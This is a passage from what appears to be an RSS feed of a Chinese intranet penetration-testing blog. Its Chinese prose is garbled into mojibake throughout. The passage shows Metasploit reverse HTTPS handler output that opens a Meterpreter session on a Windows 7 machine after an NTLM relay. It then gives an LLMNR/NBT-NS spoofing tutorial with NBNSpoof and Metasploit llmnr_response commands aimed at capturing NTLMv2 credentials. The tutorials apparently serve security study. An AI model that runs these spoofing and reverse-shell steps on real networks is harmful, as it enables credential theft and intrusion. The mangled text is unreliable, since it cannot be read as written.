&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„msfå·²ç»åå¼¹å›æ¥Windows 7 çš„shelläº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: liexek5a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: liexek5a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Staging x64 payload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;201308&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.105&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: liexek5a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.0.107:4444 -&amp;gt; 127.0.0.1 &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-02-14 18:41:51 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; sysinfo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Computer        : WIN7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS              : Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6.1 Build 7601, Service Pack 1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Architecture    : x64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System Language : en_US
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain          : HACK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Logged On Users : &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Meterpreter     : x64/windows
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x03-æ€»ç»“&#34;&gt;0x03 æ€»ç»“&lt;/h1&gt;
&lt;p&gt;ä¸¤ç§ä½œä¸ºNTLMé‡æ”¾æ”»å‡»çš„æ–¹å¼ï¼Œä½¿ç”¨Responderé‡Œé¢çš„LLMNR/NBNSä¼šæ¯”ä½¿ç”¨smbrelayxå¥½ä¸€ç‚¹ï¼Œå› ä¸ºsmbrelayxéœ€è¦ç›®æ ‡æœºå™¨å»è¿æ¥æˆ‘ä»¬çš„kaliï¼Œåº”è¯¥å¾ˆå°‘ä¼šæœ‰äººä¸»åŠ¨å»é€äººå¤´äº†å§å“ˆå“ˆï¼Œä¸»è¦æ˜¯åœ¨å…·ä½“åœºæ™¯åˆ©ç”¨çš„é—®é¢˜ï¼ŒåŒ…æ‹¬smbç­¾åç­‰å› ç´ ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å‚è€ƒ&#34;&gt;å‚è€ƒ&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://evilash.me/2020/12/03/NTLMExplore.html&#34;&gt;http://evilash.me/2020/12/03/NTLMExplore.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cloud.tencent.com/developer/article/1904077&#34;&gt;https://cloud.tencent.com/developer/article/1904077&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sec-in.com/article/174&#34;&gt;https://www.sec-in.com/article/174&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/3560&#34;&gt;https://xz.aliyun.com/t/3560&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>LLMNR/NBT-NSæ¬ºéª—æ”»å‡»</title>
      <link>https://xxe.icu/llmnr_nbt-ns.html</link>
      <pubDate>Sat, 12 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/llmnr_nbt-ns.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-åŸºæœ¬æ¦‚å¿µ&#34;&gt;0x00 åŸºæœ¬æ¦‚å¿µ&lt;/h1&gt;
&lt;p&gt;LLMNRï¼†NBT-NSæ¬ºéª—æ”»å‡»å¯ä»¥ä½œä¸ºæˆ‘ä»¬å†…ç½‘æ¸—é€ä¸­çš„ä¸€ç§æ‰‹æ³•ï¼Œä¸»è¦æ˜¯åˆ©ç”¨LLMNRã€NetBIOSå’ŒWPADæœºåˆ¶è¿›è¡Œçš„ä¸­é—´äººæ”»å‡»è·å–åˆ°NTLMv2å‡­è¯æˆ–è€…HTTPè®¤è¯æ˜æ–‡å’Œç›®æ ‡ç³»ç»Ÿçš„æƒé™ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹è¿™å‡ ä¸ªåŠŸèƒ½çš„åŸºæœ¬æ¦‚å¿µã€‚&lt;/p&gt;
&lt;h2 id=&#34;llmnr&#34;&gt;LLMNR&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ&lt;/strong&gt;( &lt;strong&gt;LLMNR&lt;/strong&gt; ) æ˜¯ä¸€ç§åŸºäºåŸŸåç³»ç»Ÿæ•°æ®åŒ…æ ¼å¼çš„åè®®ï¼Œå®ƒå…è®¸IPv4å’ŒIPv6ä¸»æœºä¸ºåŒä¸€æœ¬åœ°é“¾è·¯ä¸Šçš„ä¸»æœºæ‰§è¡Œåç§°è§£æã€‚&lt;/p&gt;
&lt;h3 id=&#34;åŒ…å¤´ç»“æ„&#34;&gt;åŒ…å¤´ç»“æ„&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ID - ç”±ç”Ÿæˆä»»ä½•ç±»å‹æŸ¥è¯¢çš„ç¨‹åºåˆ†é…çš„ 16 ä½æ ‡è¯†ç¬¦ã€‚&lt;/li&gt;
&lt;li&gt;QR - æŸ¥è¯¢/å“åº”ã€‚&lt;/li&gt;
&lt;li&gt;OPCODE - ä¸€ä¸ª 4 ä½å­—æ®µï¼ŒæŒ‡å®šæ­¤æ¶ˆæ¯ä¸­çš„æŸ¥è¯¢ç±»å‹ã€‚æ­¤å€¼ç”±æŸ¥è¯¢çš„å‘èµ·è€…è®¾ç½®å¹¶å¤åˆ¶åˆ°å“åº”ä¸­ã€‚æœ¬è§„èŒƒå®šä¹‰äº†æ ‡å‡†æŸ¥è¯¢å’Œå“åº”çš„è¡Œä¸ºï¼ˆæ“ä½œç å€¼ä¸ºé›¶ï¼‰ã€‚æœªæ¥çš„è§„èŒƒå¯èƒ½ä¼šå®šä¹‰å…¶ä»–æ“ä½œç ä¸ LLMNR çš„ä½¿ç”¨ã€‚&lt;/li&gt;
&lt;li&gt;C - å†²çªã€‚&lt;/li&gt;
&lt;li&gt;TC - æˆªæ–­ã€‚&lt;/li&gt;
&lt;li&gt;T - æš‚å®šã€‚&lt;/li&gt;
&lt;li&gt;Z - ä¿ç•™ä¾›å°†æ¥ä½¿ç”¨ã€‚&lt;/li&gt;
&lt;li&gt;RCODE - å“åº”ä»£ç ã€‚&lt;/li&gt;
&lt;li&gt;QDCOUNT - ä¸€ä¸ªæ— ç¬¦å· 16 ä½æ•´æ•°ï¼ŒæŒ‡å®šé—®é¢˜éƒ¨åˆ†ä¸­çš„æ¡ç›®æ•°ã€‚&lt;/li&gt;
&lt;li&gt;ANCOUNT - ä¸€ä¸ªæ— ç¬¦å·çš„ 16 ä½æ•´æ•°ï¼ŒæŒ‡å®šç­”æ¡ˆéƒ¨åˆ†ä¸­çš„èµ„æºè®°å½•æ•°ã€‚&lt;/li&gt;
&lt;li&gt;NSCOUNT - ä¸€ä¸ªæ— ç¬¦å·çš„ 16 ä½æ•´æ•°ï¼ŒæŒ‡å®šæƒé™è®°å½•éƒ¨åˆ†ä¸­åç§°æœåŠ¡å™¨èµ„æºè®°å½•çš„æ•°é‡ã€‚&lt;/li&gt;
&lt;li&gt;ARCOUNT - ä¸€ä¸ªæ— ç¬¦å· 16 ä½æ•´æ•°ï¼ŒæŒ‡å®šé™„åŠ è®°å½•éƒ¨åˆ†ä¸­çš„èµ„æºè®°å½•æ•°ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;netbios&#34;&gt;NetBIOS&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;NetBIOS&lt;/strong&gt; æ˜¯&lt;strong&gt;Network Basic Input/Output System&lt;/strong&gt;çš„é¦–å­—æ¯ç¼©å†™è¯ã€‚å®ƒæä¾›ä¸OSI æ¨¡å‹çš„ä¼šè¯å±‚ç›¸å…³çš„æœåŠ¡ï¼Œå…è®¸ä¸åŒè®¡ç®—æœºä¸Šçš„åº”ç”¨ç¨‹åºé€šè¿‡å±€åŸŸç½‘è¿›è¡Œé€šä¿¡ã€‚ä½œä¸ºä¸¥æ ¼çš„APIï¼ŒNetBIOS ä¸æ˜¯ç½‘ç»œåè®®ã€‚NetBIOS ä¹Ÿç”¨äºè¯†åˆ« TCP/IP(Windows) ä¸­çš„ç³»ç»Ÿåç§°ã€‚ç®€å•åœ°è¯´ï¼Œå®ƒæ˜¯ä¸€ç§å…è®¸åœ¨å±€åŸŸç½‘ä¸­é€šè¿‡ OSI æ¨¡å‹çš„ä¼šè¯å±‚è¿›è¡Œæ–‡ä»¶å’Œæ‰“å°æœºé€šä¿¡çš„åè®®ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æœåŠ¡&#34;&gt;æœåŠ¡&lt;/h3&gt;
&lt;p&gt;NetBIOS æä¾›ä¸‰ç§ä¸åŒçš„æœåŠ¡ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨äºåç§°æ³¨å†Œå’Œè§£æçš„åç§°æœåŠ¡ (NetBIOS-NS) ã€‚&lt;/li&gt;
&lt;li&gt;ç”¨äºæ— è¿æ¥é€šä¿¡çš„æ•°æ®æŠ¥åˆ†å‘æœåŠ¡ (NetBIOS-DGM)ã€‚&lt;/li&gt;
&lt;li&gt;é¢å‘è¿æ¥é€šä¿¡çš„ä¼šè¯æœåŠ¡ (NetBIOS-SSN) ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;SMBæ˜¯ä¸Šå±‚ï¼Œæ˜¯è¿è¡Œåœ¨ Session Service å’Œ Datagram æœåŠ¡ä¹‹ä¸Šçš„æœåŠ¡ï¼Œä¸è¦æ··æ·†ä¸º NetBIOS æœ¬èº«çš„å¿…è¦ç»„æˆéƒ¨åˆ†ã€‚ç°åœ¨å®ƒå¯ä»¥è¿è¡Œåœ¨ TCP ä¹‹ä¸Šï¼Œåªéœ€è¦ä¸€ä¸ªå°ä¸ºæ¯ä¸ª SMB æ¶ˆæ¯æ·»åŠ æ•°æ®åŒ…é•¿åº¦çš„é€‚é…å±‚ï¼›è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸º TCP ä»…æä¾›å­—èŠ‚æµæœåŠ¡ï¼Œæ²¡æœ‰æ•°æ®åŒ…è¾¹ç•Œçš„æ¦‚å¿µã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;åç§°æœåŠ¡&#34;&gt;åç§°æœåŠ¡&lt;/h3&gt;
&lt;p&gt;ä¸ºäº†å¯åŠ¨ä¼šè¯æˆ–åˆ†å‘æ•°æ®æŠ¥ï¼Œåº”ç”¨ç¨‹åºå¿…é¡»ä½¿ç”¨åç§°æœåŠ¡æ³¨å†Œå…¶ NetBIOS åç§°ã€‚NetBIOS åç§°çš„é•¿åº¦ä¸º 16 ä¸ªå…«ä½å­—èŠ‚ï¼Œå¹¶ä¸”æ ¹æ®ç‰¹å®šçš„å®ç°è€Œæœ‰æ‰€ä¸åŒã€‚é€šå¸¸ï¼Œç§°ä¸º NetBIOS åç¼€çš„ç¬¬ 16 ä¸ªå…«ä½å­—èŠ‚æŒ‡å®šèµ„æºçš„ç±»å‹ï¼Œå¹¶å¯ç”¨äºå‘Šè¯‰å…¶ä»–åº”ç”¨ç¨‹åºç³»ç»Ÿæä¾›çš„æœåŠ¡ç±»å‹ã€‚åœ¨NBTä¸­ï¼Œåç§°æœåŠ¡åœ¨ UDP ç«¯å£ 137 ä¸Šè¿è¡Œï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨ TCP ç«¯å£ 137ï¼Œä½†å¾ˆå°‘ä½¿ç”¨ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;NetBIOS æä¾›çš„åç§°æœåŠ¡åŸè¯­æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ·»åŠ åç§°â€”â€”æ³¨å†Œä¸€ä¸ª NetBIOS åç§°ã€‚&lt;/li&gt;
&lt;li&gt;æ·»åŠ ç»„åâ€”â€”æ³¨å†Œä¸€ä¸ª NetBIOSâ€œç»„â€åã€‚&lt;/li&gt;
&lt;li&gt;åˆ é™¤åç§° - å–æ¶ˆæ³¨å†Œ NetBIOS åç§°æˆ–ç»„åç§°ã€‚&lt;/li&gt;
&lt;li&gt;æŸ¥æ‰¾åç§° - åœ¨ç½‘ç»œä¸ŠæŸ¥æ‰¾ NetBIOS åç§°ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Microsoft ä¸æ”¯æŒ&lt;a href=&#34;https://en.wikipedia.org/wiki/IPv6&#34;&gt;Internet åè®®ç‰ˆæœ¬ 6 (IPv6)&lt;/a&gt;çš„ NetBIOS åç§°è§£æã€‚&lt;/p&gt;
&lt;h3 id=&#34;èŠ‚ç‚¹ç±»å‹&#34;&gt;èŠ‚ç‚¹ç±»å‹&lt;/h3&gt;
&lt;p&gt;åœ¨ Windows ä¸‹ï¼Œè”ç½‘è®¡ç®—æœºçš„&lt;strong&gt;èŠ‚ç‚¹ç±»å‹&lt;/strong&gt;ä¸å…¶å°† NetBIOS åç§°è§£æä¸ºIP åœ°å€çš„æ–¹å¼æœ‰å…³ã€‚è¿™å‡å®š NetBIOS èŠ‚ç‚¹æœ‰ä»»ä½• IP åœ°å€ï¼Œåªæœ‰å½“ NetBIOS åœ¨ NBT ä¸Šè¿è¡Œæ—¶æ‰èƒ½ä¿è¯ï¼›å› æ­¤ï¼ŒèŠ‚ç‚¹ç±»å‹ä¸æ˜¯ NetBIOS æœ¬èº«çš„å±æ€§ï¼Œè€Œæ˜¯ Windows OS ç¯å¢ƒä¸­ NetBIOS å’Œ TCP/IP ä¹‹é—´äº¤äº’çš„å±æ€§ã€‚æœ‰å››ç§èŠ‚ç‚¹ç±»å‹ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BèŠ‚ç‚¹ï¼š0x01å¹¿æ’­&lt;/li&gt;
&lt;li&gt;P èŠ‚ç‚¹ï¼š0x02 å¯¹ç­‰ç‚¹ï¼ˆä»…é™ WINSï¼‰&lt;/li&gt;
&lt;li&gt;MèŠ‚ç‚¹ï¼š0x04æ··åˆï¼ˆå¹¿æ’­ï¼Œç„¶åWINSï¼‰&lt;/li&gt;
&lt;li&gt;HèŠ‚ç‚¹ï¼š0x08 Hybridï¼ˆWINSï¼Œç„¶åå¹¿æ’­ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;wpad&#34;&gt;WPAD&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Web ä»£ç†è‡ªåŠ¨å‘ç° (WPAD) åè®®&lt;/strong&gt;æ˜¯ç»„ç»‡å…è®¸å‘˜å·¥é€šè¿‡ä»£ç†æœåŠ¡å™¨è®¿é—®äº’è”ç½‘ï¼Œä»¥æé«˜æ€§èƒ½ã€ç¡®ä¿å®‰å…¨å’Œè·Ÿè¸ªæµé‡ã€‚è¿æ¥åˆ°å…¬å¸ç½‘ç»œçš„ç”¨æˆ·éœ€è¦çŸ¥é“ç‰¹å®š URL çš„ä»£ç†æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨ DHCP å’Œ/æˆ– DNS å‘ç°æ–¹æ³•æ¥å®šä½é…ç½®æ–‡ä»¶çš„ URL çš„ä¸€ç§æ–¹æ³•ã€‚ ä¸€æ—¦é…ç½®æ–‡ä»¶çš„æ£€æµ‹å’Œä¸‹è½½å®Œæˆï¼Œå°±å¯ä»¥æ‰§è¡Œå®ƒæ¥ç¡®å®šæŒ‡å®š URL çš„ä»£ç†ã€‚åœ¨IEåœ¨ç½‘ç»œè®¾ç½®æ‰“å‹¾å°±è¡¨ç¤ºå¯ç”¨äº†wpadï¼Œé»˜è®¤æ˜¯ä¸å¼€å¯çš„ï¼Œä½†æ˜¯åœ¨ Windows 10 ä¸­WPAD é»˜è®¤æ˜¯å¯ç”¨çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/LLMNR_NetBIOS/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;0x01-å·¥ä½œåŸç†&#34;&gt;0x01 å·¥ä½œåŸç†&lt;/h1&gt;
&lt;p&gt;æˆ‘ä»¬è¦æ˜ç™½LLNBR(UDP/5355)å’ŒNetBIOS(UDP/137) ä¸¤è€…çš„åŒºåˆ«ï¼Œå…¶å®è¿™ä¸¤ä¸ªéƒ½æ˜¯ç”¨äºåç§°è§£æçš„ï¼ŒNetBIOSæ˜¯ä»Windows 2000å¼€å§‹å¯ç”¨çš„ï¼ŒLLNNRæ˜¯ä½œä¸ºwindows Vistaä»¥ä¸Šçš„ç³»ç»Ÿå¼€å§‹å¯ç”¨çš„åè®®ï¼Œè¿˜æœ‰å°±æ˜¯NetBIOSæ˜¯Windowsè¿›è¡Œé€šä¿¡çš„APIï¼ŒLLMNRæ˜¯ç½‘ç»œåè®®ï¼Œä½†æ˜¯ä¸¤è€…ä¸»è¦åŠŸèƒ½æ˜¯ä¸€æ ·çš„ã€‚åœ¨ç³»ç»Ÿè¿›è¡Œåç§°è§£æä¼šè¿›è¡Œä»¥ä¸‹çš„æ­¥éª¤ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ£€æŸ¥ä»¥ç¡®è®¤è¯·æ±‚æ˜¯å¦é’ˆå¯¹æœ¬åœ°è®¡ç®—æœºåç§°ã€‚&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥æœ€è¿‘æˆåŠŸè§£æçš„åç§°çš„æœ¬åœ°ç¼“å­˜ã€‚&lt;/li&gt;
&lt;li&gt;æœç´¢æœ¬åœ°hostsæ–‡ä»¶å½“ä¸­è§£æã€‚&lt;/li&gt;
&lt;li&gt;æŸ¥è¯¢ DNS æœåŠ¡å™¨ã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœå¯ç”¨äº† LLMNRï¼Œåˆ™åœ¨æœ¬åœ°å­ç½‘ä¸­å¹¿æ’­ LLMNR æŸ¥è¯¢ä»¥è¯·æ±‚å…¶å¯¹ç­‰æ–¹è¿›è¡Œè§£æã€‚&lt;/li&gt;
&lt;li&gt;å¦‚æœå¯ç”¨äº† NetBIOSï¼Œå¦‚æœåç§°ä¸åœ¨æœ¬åœ° NetBIOS ç¼“å­˜ä¸­ï¼Œåˆ™å°è¯•é€šè¿‡å‘æœ¬åœ°å­ç½‘å¹¿æ’­ NetBIOS-NS æŸ¥è¯¢æ¥è§£æ NetBIOS åç§°ã€‚å¦‚æœè¿™æ ·é…ç½®ï¼Œæ­¤æ­¥éª¤å¯èƒ½ä¼šä½¿ç”¨ Windows Internet åç§°æœåŠ¡ (WINS) æœåŠ¡å™¨ä»¥åŠ LAN ç®¡ç†å™¨ä¸»æœº (LMHOSTS) æ–‡ä»¶ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬åœ¨ä½¿ç”¨åç§°æŸ¥æ‰¾ä¸»æœºçš„æ—¶å€™(ä½¿ç”¨win+Rï¼Œè¾“å…¥\\errorhost)ï¼Œä¼šæ‰§è¡Œä¸Šé¢çš„æ­¥éª¤ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´åªæœ‰å½“æˆ‘ä»¬è¾“å…¥è®¡ç®—æœºå’ŒDNSæœåŠ¡å™¨ä¸å­˜åœ¨çš„ä¸»æœºåç§°çš„æ—¶å€™æ‰ä¼šè§¦å‘LLMNRå’ŒNetBIOSï¼Œç¬”è€…æ„Ÿè§‰è¿™ä¸ªæ¼æ´è¿˜æ˜¯æœ‰å±€é™æ€§çš„ï¼Œæ‰€ä»¥åœ¨å†…ç½‘æ¸—é€ä¸­ç”¨çš„ä¸æ˜¯å¾ˆå¤šã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x02-æ”»å‡»å·¥å…·&#34;&gt;0x02 æ”»å‡»å·¥å…·&lt;/h1&gt;
&lt;h2 id=&#34;nbnspoof---netbios-name-service-spoofer&#34;&gt;NBNSpoof - NetBIOS Name Service Spoofer&lt;/h2&gt;
&lt;p&gt;NBNSpoof æ˜¯ä¸€ç§ç”¨äºè‡ªåŠ¨åˆ¶ä½œå¯¹ NetBIOS åç§°æœåŠ¡ (NBNS) åç§°æŸ¥è¯¢çš„å“åº”çš„å·¥å…·ã€‚å½“ Windows æœºå™¨æ— æ³•é€šè¿‡ DNS å’Œ WINS è§£æåŸŸåæ—¶ï¼Œå®ƒä»¬å°†å‘é€å¹¿æ’­ NBNS æŸ¥è¯¢ä»¥æŸ¥çœ‹æœ‰é—®é¢˜çš„åç§°æ˜¯å¦ä¸æœ¬åœ°ç½‘ç»œä¸Šçš„ä»»ä½•è®¡ç®—æœºåç§°åŒ¹é…ã€‚åœ¨å—å®³è€…é”™è¯¯é”®å…¥åŸŸåæˆ– DNS æœåŠ¡å™¨æ— æ³•è®¿é—®çš„æƒ…å†µä¸‹ï¼Œå¯¹è¿™äº›è¯·æ±‚åšå‡ºå“åº”å¯¹æ”»å‡»è€…ç‰¹åˆ«æœ‰ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/nomex/nbnspoof&#34;&gt;https://github.com/nomex/nbnspoof&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nbnspoof.py [-v] -i &amp;lt;interface&amp;gt; -n &amp;lt;regexp&amp;gt; -h &amp;lt;ip address&amp;gt; -m &amp;lt;MAC&amp;gt; [-p &amp;lt;ip address&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-v Verbose output of sniffed NBNS name queries, and responses sent
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-i The interface you want to sniff and send on
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-n A regular expression applied to each query to determine whether a
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   spoofed response will be sent
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-h The IP address that will be sent in spoofed responses
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-p (optional) The IP address of the victim (if unset, pwn all)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-m The source MAC address for spoofed responses
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;llmnr_response&#34;&gt;llmnr_response&lt;/h2&gt;
&lt;p&gt;è¿™æ˜¯ä¸€æ¬¾åœ¨msfä¸­ä½¿ç”¨çš„å·¥å…·ã€‚åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf &amp;gt; use auxiliary/spoof/llmnr/llmnr_response
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; show actions
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ...actions...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; set ACTION &amp;lt; action-name &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf auxiliary(llmnr_response) &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ...show and set options...
